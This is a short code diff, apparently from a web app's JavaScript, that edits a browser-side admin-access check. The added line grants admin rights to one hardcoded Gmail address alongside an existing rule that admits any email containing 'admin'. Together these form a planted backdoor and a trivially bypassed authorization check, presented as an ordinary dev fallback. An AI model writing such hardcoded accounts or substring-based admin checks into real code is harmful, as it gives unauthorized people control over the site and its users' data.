@@ -12,7 +12,7 @@ const verifyAdminAccess = async () => {
   }
   
   // A simple fallback for dev: email check for admin role
-  const isAdmin = (user.email && user.email.includes('admin')) || user.role === 'admin';
+  const isAdmin = (user.email && (user.email.includes('admin') || user.email === 'clovas.verify@gmail.com')) || user.role === 'admin';
   if (!isAdmin) {
     showToast('Unauthorized access. Admin only.', 'error');
     window.location.href = '../dashboard.html';
